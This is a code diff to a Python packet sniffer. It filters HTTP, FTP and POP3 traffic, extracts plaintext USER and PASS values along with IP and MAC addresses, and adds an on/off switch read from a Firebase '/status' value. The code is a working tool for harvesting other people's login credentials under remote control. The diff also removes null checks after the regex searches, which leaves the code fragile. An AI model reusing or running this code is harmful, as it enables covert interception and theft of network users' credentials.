@@ -24,8 +24,8 @@ class Sniffer(object):
         # Status update
         self._firebase.patch('/status', {"status": "ON"})
 
-        pattern = 'tcp and dst port 80 or dst port 21 or dst port 110'
-        # pattern = 'tcp and dst port 80 or dst port 21'
+        # pattern = 'tcp and dst port 80 or dst port 21 or dst port 110'
+        pattern = 'tcp and dst port 80 or dst port 21'
 
         self.pc = pcap.pcap(kwargs['interface'])
         self.pc.setfilter(pattern)
@@ -123,11 +123,6 @@ class Sniffer(object):
         if 'USER' in tcp_pkt.data:
             regex = re.compile('USER (.*)')
             user_obj = regex.search(tcp_pkt.data)
-            if user_obj is None:
-                regex = re.compile('user (.*)')
-                user_obj = regex.search(tcp_pkt.data)
-                if user_obj is None:
-                    return
 
             user_d = {'USER': user_obj.group(1).rstrip('\r')}
             self._pick_ftp_info(user_d, socket.inet_ntoa(ip_pkt.src),
@@ -137,11 +132,21 @@ class Sniffer(object):
             regex = re.compile('PASS (.*)')
             password_obj = regex.search(tcp_pkt.data)
 
-            if password_obj is None:
-                regex = re.compile('pass (.*)')
-                password_obj = regex.search(tcp_pkt.data)
-                if password_obj is None:
-                    return
+            password_d = {'PASS': password_obj.group(1).rstrip('\r')}
+            self._pick_ftp_info(password_d, socket.inet_ntoa(ip_pkt.src),
+                                socket.inet_ntoa(ip_pkt.dst), tcp_pkt.dport,
+                                binascii.hexlify(eth_pkt.src))
+        elif 'user' in tcp_pkt.data:
+            regex = re.compile('user (.*)')
+            user_obj = regex.search(tcp_pkt.data)
+
+            user_d = {'USER': user_obj.group(1).rstrip('\r')}
+            self._pick_ftp_info(user_d, socket.inet_ntoa(ip_pkt.src),
+                                socket.inet_ntoa(ip_pkt.dst), tcp_pkt.dport,
+                                binascii.hexlify(eth_pkt.src))
+        elif 'pass' in tcp_pkt.data:
+            regex = re.compile('pass (.*)')
+            password_obj = regex.search(tcp_pkt.data)
 
             password_d = {'PASS': password_obj.group(1).rstrip('\r')}
             self._pick_ftp_info(password_d, socket.inet_ntoa(ip_pkt.src),
@@ -193,30 +198,35 @@ class Sniffer(object):
 
     def loop(self):
         while True:
-            try:
-                for ts, buf in self.pc:
-                    eth = dpkt.ethernet.Ethernet(buf)
-                    ip = eth.data
-                    tcp = ip.data
-                    if len(tcp.data) > 0:
-                        # print tcp.dport
-                        # make sure the pattern is correct
-                        if tcp.dport == 80:
-                            self._get_http_payload(eth, ip, tcp)
-                        elif tcp.dport == 21 or tcp.dport == 110:
-                            self._get_ftp_pop_payload(eth, ip, tcp)
-                        else:
-                            pass
+            result = self._firebase.get('/status', None)
+            if result['status'] == 'ON':
+                try:
+                    for ts, buf in self.pc:
+                        eth = dpkt.ethernet.Ethernet(buf)
+                        ip = eth.data
+                        tcp = ip.data
+                        if len(tcp.data) > 0:
+                            print 'Packet in dst port number', tcp.dport
+                            # make sure the pattern is correct
+                            if tcp.dport == 80:
+                                self._get_http_payload(eth, ip, tcp)
+                            elif tcp.dport == 21 or tcp.dport == 110:
+                                self._get_ftp_pop_payload(eth, ip, tcp)
+                            else:
+                                pass
 
-            except KeyboardInterrupt:
-                nrecv, ndrop, nifdrop = self.pc.stats()
-                print '\n%d packets received by filter' % nrecv
-                print '%d packets dropped by kernel' % ndrop
-                # print 'All user info: '
-                # pprint(self.all_user_info)
-                break
-            except (NameError, TypeError):
-                # print "No packet"
+                except KeyboardInterrupt:
+                    nrecv, ndrop, nifdrop = self.pc.stats()
+                    print '\n%d packets received by filter' % nrecv
+                    print '%d packets dropped by kernel' % ndrop
+                    # print 'All user info: '
+                    # pprint(self.all_user_info)
+                    break
+                except (NameError, TypeError):
+                    # print "No packet"
+                    continue
+            else:
+                print "I can not see packets."
                 continue
 
     def __del__(self):
